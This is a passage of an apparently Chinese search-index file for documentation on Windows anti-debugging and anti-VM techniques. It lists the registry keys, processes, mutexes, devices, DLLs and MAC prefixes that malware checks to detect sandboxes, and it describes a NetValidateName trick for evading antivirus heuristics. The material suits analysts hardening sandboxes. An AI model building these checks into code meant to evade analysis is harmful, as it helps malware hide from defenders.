c:\\windows\\system32\\drivers\\hgfs.sys","title":"\u68c0\u67e5\u7279\u5b9a\u6587\u4ef6\u662f\u5426\u5b58\u5728"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_37","text":"GetFileAttributes \u6b64\u65b9\u6cd5\u5229\u7528\u5e38\u89c1\u4e3b\u673a\u7cfb\u7edf\u548c\u865a\u62df\u73af\u5883\u4e2d\u5b58\u5728\u7684\u76ee\u5f55\u7684\u5dee\u5f02\u3002 \u865a\u62df\u73af\u5883\u4e2d\u5b58\u5728\u5f88\u591a\u7279\u5b9a\u4e8e\u6b64\u7c7b\u7cfb\u7edf\u7684\u76ee\u5f55\u3002 \u8fd9\u4e9b\u76ee\u5f55\u4e0d\u5b58\u5728\u4e8e\u672a\u5b89\u88c5\u865a\u62df\u73af\u5883\u7684\u666e\u901a\u4e3b\u673a\u7cfb\u7edf\u4e0a\u3002 CWSandbox c:\\analysis VirtualBox %PROGRAMFILES%\\oracle\\virtualbox guest additions\\ VMware %PROGRAMFILES%\\VMware\\","title":"\u68c0\u67e5\u7279\u5b9a\u76ee\u5f55\u662f\u5426\u5b58\u5728"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_38","text":"- GetModuleFileName - GetProcessImageFileNameA/W - QueryFullProcessImageName \u6b64\u65b9\u6cd5\u4f9d\u8d56\u4e8e\u5728\u865a\u62df\u73af\u5883\u4e2d\u542f\u52a8\u53ef\u6267\u884c\u6587\u4ef6\u7684\u7279\u6027\u3002 \u67d0\u4e9b\u73af\u5883\u4ece\u7279\u5b9a\u8def\u5f84\u542f\u52a8\u53ef\u6267\u884c\u6587\u4ef6 - \u6076\u610f\u8f6f\u4ef6\u6837\u672c\u4f1a\u68c0\u67e5\u8fd9\u4e9b\u8def\u5f84\u3002","title":"\u68c0\u67e5\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\u662f\u5426\u5305\u542b\u7279\u5b9a\u5b57\u7b26\u4e32\u4e4b\u4e00"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_39","text":"\u81ea\u5b9a\u4e49\u4ee3\u7801\uff0c\u65e0\u7279\u5b9aAPI","title":"\u68c0\u67e5\u53ef\u6267\u884c\u6587\u4ef6\u662f\u5426\u4ece\u7279\u5b9a\u76ee\u5f55\u8fd0\u884c"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_40","text":"GetFileAttributes","title":"\u68c0\u67e5\u7269\u7406\u78c1\u76d8\u9a71\u52a8\u5668\u7684\u6839\u76ee\u5f55\u4e2d\u662f\u5426\u5b58\u5728\u5177\u6709\u7279\u5b9a\u540d\u79f0\u7684\u53ef\u6267\u884c\u6587\u4ef6"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_41","text":"\u5e38\u7528\u51fd\u6570 - RegOpenKey - RegOpenKeyEx - RegQueryValue - RegQueryValueEx - RegCloseKey - RegEnumKeyEx - NtOpenKey - NtEnumerateKey - NtQueryValueKey - NtClose","title":"\u6ce8\u518c\u8868"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_42","text":"\u901a\u7528 HKLM\\Software\\Classes\\Folder\\shell\\sandbox Hyper-V HKLM\\SOFTWARE\\Microsoft\\Hyper-V HKLM\\SOFTWARE\\Microsoft\\VirtualMachine HKLM\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters HKLM\\SYSTEM\\ControlSet001\\Services\\vmicheartbeat HKLM\\SYSTEM\\ControlSet001\\Services\\vmicvss HKLM\\SYSTEM\\ControlSet001\\Services\\vmicshutdown HKLM\\SYSTEM\\ControlSet001\\Services\\vmicexchange Parallels HKLM\\SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_1AB8* Sandboxie HKLM\\SYSTEM\\CurrentControlSet\\Services\\SbieDrv HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Sandboxie VirtualBox HKLM\\SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_80EE* HKLM\\HARDWARE\\ACPI\\DSDT\\VBOX__ HKLM\\HARDWARE\\ACPI\\FADT\\VBOX__ HKLM\\HARDWARE\\ACPI\\RSDT\\VBOX__ HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxGuest HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxMouse HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxService HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxSF HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxVideo VirtualPC HKLM\\SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_5333* HKLM\\SYSTEM\\ControlSet001\\Services\\vpcbus HKLM\\SYSTEM\\ControlSet001\\Services\\vpc-s3 HKLM\\SYSTEM\\ControlSet001\\Services\\vpcuhub HKLM\\SYSTEM\\ControlSet001\\Services\\msvmmouf VMware HKLM\\SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_15AD* HKCU\\SOFTWARE\\VMware, Inc.\\VMware Tools HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools HKLM\\SYSTEM\\ControlSet001\\Services\\vmdebug HKLM\\SYSTEM\\ControlSet001\\Services\\vmmouse HKLM\\SYSTEM\\ControlSet001\\Services\\VMTools HKLM\\SYSTEM\\ControlSet001\\Services\\VMMEMCTL HKLM\\SYSTEM\\ControlSet001\\Services\\vmware HKLM\\SYSTEM\\ControlSet001\\Services\\vmci HKLM\\SYSTEM\\ControlSet001\\Services\\vmx86 HKLM\\SYSTEM\\CurrentControlSet\\Enum\\IDE\\CdRomNECVMWar_VMware_IDE_CD* HKLM\\SYSTEM\\CurrentControlSet\\Enum\\IDE\\CdRomNECVMWar_VMware_SATA_CD* HKLM\\SYSTEM\\CurrentControlSet\\Enum\\IDE\\DiskVMware_Virtual_IDE_Hard_Drive* HKLM\\SYSTEM\\CurrentControlSet\\Enum\\IDE\\DiskVMware_Virtual_SATA_Hard_Drive* Wine HKCU\\SOFTWARE\\Wine HKLM\\SOFTWARE\\Wine Xen HKLM\\HARDWARE\\ACPI\\DSDT\\xen HKLM\\HARDWARE\\ACPI\\FADT\\xen HKLM\\HARDWARE\\ACPI\\RSDT\\xen HKLM\\SYSTEM\\ControlSet001\\Services\\xenevtchn HKLM\\SYSTEM\\ControlSet001\\Services\\xennet HKLM\\SYSTEM\\ControlSet001\\Services\\xennet6 HKLM\\SYSTEM\\ControlSet001\\Services\\xensvc HKLM\\SYSTEM\\ControlSet001\\Services\\xenvdb \u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\uff0c\u6076\u610f\u8f6f\u4ef6\u53ef\u80fd\u4f1a\u679a\u4e3e\u5b50\u9879\u5e76\u68c0\u67e5\u5b50\u9879\u7684\u540d\u79f0\u662f\u5426\u5305\u542b\u67d0\u4e9b\u5b57\u7b26\u4e32\uff0c\u800c\u4e0d\u662f\u68c0\u67e5\u6307\u5b9a\u7684\u9879\u662f\u5426\u5b58\u5728\u3002 \u4f8b\u5982\uff1a\u679a\u4e3e\u201cHKLM\\SYSTEM\\ControlSet001\\Services\\\u201d\u7684\u5b50\u9879\u5e76\u641c\u7d22\u201cVBox\u201d\u5b57\u7b26\u4e32\u3002","title":"\u68c0\u67e5\u7279\u5b9a\u6ce8\u518c\u8868\u8def\u5f84\u662f\u5426\u5b58\u5728"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_43","text":"\u901a\u7528 HKLM\\HARDWARE\\Description\\System SystemBiosDate 06/23/99 HKLM\\HARDWARE\\Description\\System\\BIOS SystemProductName A M I BOCHS HKLM\\HARDWARE\\Description\\System SystemBiosVersion BOCHS HKLM\\HARDWARE\\Description\\System VideoBiosVersion BOCHS Anubis HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion ProductID 76487-337-8429955-22614 HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion ProductID 76487-337-8429955-22614 CwSandbox HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion ProductID 76487-644-3177037-23510 HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion ProductID 76487-644-3177037-23510 JoeBox HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion ProductID 55274-640-2673064-23950 HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion ProductID 55274-640-2673064-23950 Parallels HKLM\\HARDWARE\\Description\\System SystemBiosVersion PARALLELS HKLM\\HARDWARE\\Description\\System VideoBiosVersion PARALLELS QEMU HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier QEMU HKLM\\HARDWARE\\Description\\System SystemBiosVersion QEMU HKLM\\HARDWARE\\Description\\System VideoBiosVersion QEMU HKLM\\HARDWARE\\Description\\System\\BIOS SystemManufacturer QEMU VirtualBox HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier VBOX HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier VBOX HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier VBOX HKLM\\HARDWARE\\Description\\System SystemBiosVersion VBOX HKLM\\HARDWARE\\Description\\System VideoBiosVersion VIRTUALBOX HKLM\\HARDWARE\\Description\\System\\BIOS SystemProductName VIRTUAL HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum DeviceDesc VBOX HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum FriendlyName VBOX HKLM\\SYSTEM\\ControlSet002\\Services\\Disk\\Enum DeviceDesc VBOX HKLM\\SYSTEM\\ControlSet002\\Services\\Disk\\Enum FriendlyName VBOX HKLM\\SYSTEM\\ControlSet003\\Services\\Disk\\Enum DeviceDesc VBOX HKLM\\SYSTEM\\ControlSet003\\Services\\Disk\\Enum FriendlyName VBOX HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation SystemProductName VIRTUAL HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation SystemProductName VIRTUALBOX VMware HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier VMWARE HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier VMWARE HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier VMWARE HKLM\\HARDWARE\\Description\\System SystemBiosVersion VMWARE HKLM\\HARDWARE\\Description\\System SystemBiosVersion INTEL - 6040000 HKLM\\HARDWARE\\Description\\System VideoBiosVersion VMWARE HKLM\\HARDWARE\\Description\\System\\BIOS SystemProductName VMware HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum 0 VMware HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum 1 VMware HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum DeviceDesc VMware HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum FriendlyName VMware HKLM\\SYSTEM\\ControlSet002\\Services\\Disk\\Enum DeviceDesc VMware HKLM\\SYSTEM\\ControlSet002\\Services\\Disk\\Enum FriendlyName VMware HKLM\\SYSTEM\\ControlSet003\\Services\\Disk\\Enum DeviceDesc VMware HKLM\\SYSTEM\\ControlSet003\\Services\\Disk\\Enum FriendlyName VMware HKCR\\Installer\\Products ProductName vmware tools HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall DisplayName vmware tools HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall DisplayName vmware tools HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall DisplayName vmware tools HKLM\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000 CoInstallers32 *vmx* HKLM\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000 DriverDesc VMware* HKLM\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000 InfSection vmx* HKLM\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000 ProviderName VMware* HKLM\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings Device Description VMware* HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation SystemProductName VMWARE HKLM\\SYSTEM\\CurrentControlSet\\Control\\Video\\{GUID}\\Video Service vm3dmp HKLM\\SYSTEM\\CurrentControlSet\\Control\\Video\\{GUID}\\Video Service vmx_svga HKLM\\SYSTEM\\CurrentControlSet\\Control\\Video\\{GUID}\\0000 Device Description VMware SVGA* Xen HKLM\\HARDWARE\\Description\\System\\BIOS SystemProductName Xen \u5982\u4f55\u53cd\u53cd\u8c03\u8bd5 \u5982\u679c\u68c0\u67e5\u4e86\u6307\u6807\uff08\u8868\u4e2d\u7684\u6ce8\u518c\u8868\u5b57\u7b26\u4e32\uff09\uff0c\u5219\u6302\u94a9\u76ee\u6807\u51fd\u6570\u5e76\u8fd4\u56de\u9002\u5f53\u7684\u7ed3\u679c\u3002","title":"\u68c0\u67e5\u7279\u5b9a\u6ce8\u518c\u8868\u9879\u662f\u5426\u5305\u542b\u6307\u5b9a\u5b57\u7b26\u4e32"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_44","text":"\u67e5\u8be2\u7279\u5b9a\u7528\u6237\u540d GetUserNameA/W \u67e5\u8be2\u7279\u5b9a\u4e3b\u673a\u540d GetComputerNameA/W \u67e5\u8be2\u7279\u5b9a\u8ba1\u7b97\u673a\u540d GetComputerNameExA/W \u67e5\u8be2\u5185\u5b58\u5bb9\u91cf\u662f\u4e0d\u662f\u5f88\u4f4e GetMemoryStatusEx \u67e5\u8be2\u5c4f\u5e55\u5206\u8fa8\u7387\u662f\u4e0d\u662f\u4e0d\u6b63\u5e38 GetDesktopWindow GetWindowRect GetSystemMetrics SystemParametersInfo GetMonitorInfo \u67e5\u8be2\u8fdb\u7a0bID\u662f\u4e0d\u662f\u5f88\u4f4e GetSystemInfo \u67e5\u8be2\u663e\u793a\u5668\u662f\u4e0d\u662f\u5f88\u5c11 EnumDisplayMonitors GetSystemMetrics \u67e5\u8be2\u786c\u76d8\u7a7a\u95f4\u662f\u4e0d\u662f\u5f88\u5c11 DeviceIoControl GetDiskFreeSpaceExA/W \u67e5\u8be2\u7cfb\u7edf\u542f\u52a8\u65f6\u95f4\u662f\u4e0d\u662f\u5f88\u77ed GetTickCount GetTickCount64 NtQuerySystemInformation \u67e5\u8be2\u7cfb\u7edf\u662f\u4e0d\u662f\u4ece\u865a\u62df\u786c\u76d8\u542f\u52a8(Win8\u4ee5\u4e0a) IsNativeVhdBoot \u5982\u4f55\u53cd\u53cd\u8c03\u8bd5 hook\u51fd\u6570","title":"\u64cd\u4f5c\u7cfb\u7edf\u901a\u7528\u67e5\u8be2"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_45","text":"","title":"\u5168\u5c40\u7cfb\u7edf\u5bf9\u8c61"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_46","text":"CreateMutexA/W OpenMutexA/W DeepFreeze Frz_State Sandboxie SandboxieSandboxie_SingleInstanceMutex_Control SBIE_BOXED_ServiceInitComplete_Mutex1 VirtualPC MicrosoftVirtualPC7UserServiceMakeSureWe'reTheOnlyOneMutex","title":"\u68c0\u67e5\u5168\u5c40\u4e92\u65a5\u4f53"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_47","text":"NtCreateFile VirtualBox \\\\.\\VBoxMiniRdDN \\\\.\\VBoxMiniRdrDN \\\\.\\VBoxGuest \\\\.\\VBoxTrayIPC \\\\.\\VBoxMouse \\\\.\\VBoxVideo VMware \\\\.\\HGFS \\\\.\\vmci","title":"\u68c0\u67e5\u7279\u5b9a\u865a\u62df\u8bbe\u5907"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_48","text":"NtCreateFile VirtualBox \\\\.\\pipe\\VBoxMiniRdDN \\\\.\\pipe\\VBoxTrayIPC","title":"\u68c0\u67e5\u7279\u5b9a\u547d\u540d\u7ba1\u9053"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_49","text":"NtOpenDirectoryObject NtQueryDirectoryObject Hyper-V VmGenerationCounter \\Device Parallels prl_pv \\Device prl_tg \\Device prl_time \\Device Sandboxie SandboxieDriverApi \\Device SbieDrv \\Driver SbieSvcPort \\RPC Control VirtualBox VBoxGuest \\Device VBoxMiniRdr \\Device VBoxVideo \\Driver VBoxMouse \\Driver VirtualPC VirtualMachineServices \\Device 1-driver-vmsrvc \\Driver VMware vmmemctl \\Device","title":"\u68c0\u67e5\u5168\u5c40\u5bf9\u8c61"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#sandboxie","text":"GetFileAttributes \\Sandbox","title":"\u68c0\u67e5\u5bf9\u8c61\u76ee\u5f55\uff08\u4ec5\u9650Sandboxie\uff09"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#sandboxie_1","text":"","title":"\u68c0\u67e5\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u662f\u5426\u5b58\u5728\u865a\u62df\u6ce8\u518c\u8868\uff08\u4ec5\u9650Sandboxie\uff09"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_50","text":"FindWindow \u68c0\u67e5\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u662f\u5426\u5b58\u5728\u5177\u6709\u7279\u5b9a\u7c7b\u540d\u79f0\u7684\u7a97\u53e3 \u68c0\u67e5\u9876\u5c42\u7a97\u53e3\u6570\u91cf\u662f\u5426\u592a\u5c0f","title":"\u7528\u6237\u754c\u9762\u7ec4\u4ef6"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_51","text":"\u8fd9\u5c31\u6709\u70b9\u590d\u6742\u4e86 CreateToolhelp32Snapshot psapi.EnumProcesses (WinXP, Vista) kernel32.EnumProcesses \u68c0\u67e5\u8c03\u8bd5\u6743\u9650 \u4f7f\u7528\u4e0d\u5e73\u8861\u6808","title":"\u7cfb\u7edf\u529f\u80fd"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_52","text":"","title":"\u8fdb\u7a0b"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_53","text":"CreateToolhelp32Snapshot psapi.EnumProcesses _(WinXP, Vista)_ kernel32.EnumProcesses _(Win7+)_ JoeBox joeboxserver.exe joeboxcontrol.exe Parallels prl_cc.exe prl_tools.exe VirtualBox vboxservice.exe vboxtray.exe VirtualPC vmsrvc.exe vmusrvc.exe VMware vmtoolsd.exe vmacthlp.exe vmwaretray.exe vmwareuser.exe vmware.exe vmount2.exe Xen xenservice.exe xsvc_depriv.exe WPE Pro WPE Pro.exe","title":"\u68c0\u67e5\u8fd0\u884c\u7684\u7279\u5b9a\u8fdb\u7a0b"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_54","text":"GetModuleHandle CWSandbox api_log.dll dir_watch.dll pstorec.dll Sandboxie sbiedll.dll ThreatExpert dbghelp.dll VirtualPC vmcheck.dll WPE Pro wpespy.dll","title":"\u68c0\u67e5\u8fd0\u884c\u7a7a\u95f4\u52a0\u8f7d\u7684\u7279\u5b9a\u5e93"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_55","text":"kernel32.GetProcAddress kernel32.LdrGetProcedureAddress _(called internally)_ ntdll.LdrGetProcedureAddress ntdll.LdrpGetProcedureAddress _(called internally)_ Wine kernel32.dll wine_get_unix_file_name ntdll.dll wine_get_version","title":"\u68c0\u67e5\u7279\u5b9a\u5e93\u4e2d\u662f\u5426\u5b58\u5728\u7279\u5b9a\u51fd\u6570"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_56","text":"LoadLibraryA/W","title":"\u68c0\u67e5\u662f\u5426\u53ef\u4ee5\u52a0\u8f7d\u5176\u4ed6\u5e93"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#sandboxie_2","text":"NtQueryVirtualMemory","title":"\u68c0\u67e5\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u4e2d\u662f\u5426\u5b58\u5728\u7279\u5b9a\u7ec4\u4ef6\uff08\u4ec5\u9650 Sandboxie\uff09"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_57","text":"","title":"\u7f51\u7edc"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_58","text":"","title":"\u7279\u5b9a\u7f51\u7edc\u5c5e\u6027"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#mac","text":"GetAdaptersAddresses GetAdaptersInfo Parallels Parallels 00:1C:42 \\x00\\x1C\\x42 VirtualBox 08:00:27 \\x08\\x00\\x27 VMware 00:05:69 \\x00\\x05\\x69 00:0C:29 \\x00\\x0C\\x29 00:1C:14 \\x00\\x1C\\x14 00:50:56 \\x00\\x50\\x56 Xen 00:16:E3 \\x00\\x16\\xE3","title":"\u68c0\u67e5\u7279\u5b9aMAC\u5730\u5740"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_59","text":"GetAdaptersAddresses GetAdaptersInfo VMware Vmware","title":"\u68c0\u67e5\u9002\u914d\u5668\u7279\u5b9a\u540d\u79f0"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_60","text":"WNetGetProviderName VirtualBox VirtualBox Shared Folders","title":"\u68c0\u67e5\u7279\u5b9a\u7f51\u7edc\u5171\u4eab\u540d"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_61","text":"\u4e5f\u5c31\u662f\u8bf4\uff0c\u7279\u5b9a\u7684\u7f51\u7edc\u533a\u57df\u662f\u6c99\u7bb1\u7279\u6709\u7684\uff0c\u8bc6\u522b\u5230\u6c99\u7bb1\u7684\u7f51\u7edc\u540e\u5c31\u77e5\u9053\u8fd0\u884c\u5728\u6c99\u7bb1\u3002 \u56fd\u5916\u7684\u4e00\u4e9b\u6c99\u7bb1\u7f51\u7edc\u533a\u57df\u7279\u5f81\u4e0d\u8d34\u4e86\uff0c\u90a3\u5728\u4e2d\u56fd\u4e0d\u9002\u7528\u3002","title":"\u68c0\u67e5\u7f51\u7edc\u662f\u5426\u5c5e\u4e8e\u5b89\u5168\u8fb9\u754c"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#netvalidatename","text":"Initially this technique was designed for bypassing AV detection. It\u2019s not an evasion technique itself \u2014 instead it abuses interesting side-effects after the function is called. The main idea is to use the determined result of NetValidateName API function call with invalid argument as Server name (for example \u201c123\u201d) for calculating jump address dynamically. This jump usually points into the middle of some instruction to bypass heuristic analysis of AV software. But this technique also has (at least) one side-effect. If default NetBIOS settings are set in the operating system (NetBIOS over TCP/IP is enabled) the return code is always equal to ERROR_BAD_NETPATH (0x35). If NetBIOS over TCP/IP is switched off then return code is ERROR_NETWORK_UNREACHABLE (0x4CF). Thus jump address will be calculated incorrectly and it will lead the sample to crash. Therefore, this technique can be used to break emulation in sandboxes where NetBIOS over TCP/IP is switched off for preventing junk traffic generation by the OS. Note: NetBIOS over TCP/IP is switched off not to generate additional network requests when resolving server IP via DNS. Switching this option off cancels lookup requests in local network. \u7ffb\u8bd1\u4e4b\u540e\u5927\u610f\u662f \u4f7f\u7528 NetValidateName API\u6839\u636e \u4e3b\u673a\u662f\u5426\u662f\u9ed8\u8ba4\u7684NetBIOS\u914d\u7f6e \u3002\u662f\u4e0e\u5426\u7684\u8fd4\u56de\u7801\u4e0d\u540c\uff0c\u6839\u636e\u8fd4\u56de\u7801\u5224\u65ad\u662f\u5426\u6c99\u7bb1\u3002","title":"\u57fa\u4e8e NetValidateName \u7ed3\u679c\u7684\u53cd\u6c99\u7bb1\u6280\u672f"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#cuckoo-resultserver","text":"\u8be5\u6280\u672f\u53ef\u7528\u4e8e\u68c0\u6d4bCuckoo Sandbox\u865a\u62df\u73af\u5883\u3002 \u6076\u610f\u8f6f\u4ef6\u4f1a\u679a\u4e3e\u6240\u6709\u5df2\u5efa\u7acb\u7684\u4f20\u51fa TCP \u8fde\u63a5\uff0c\u5e76\u68c0\u67e5\u662f\u5426\u5b58\u5728\u4e0e Cuckoo ResultServer \u4f7f\u7528\u7684\u7279\u5b9a TCP \u7aef\u53e3 (2042) \u7684\u8fde\u63a5\u3002 \u9488\u5bf9\u7279\u5b9a\u7684\u6c99\u7bb1","title":"\u57fa\u4e8eCuckoo 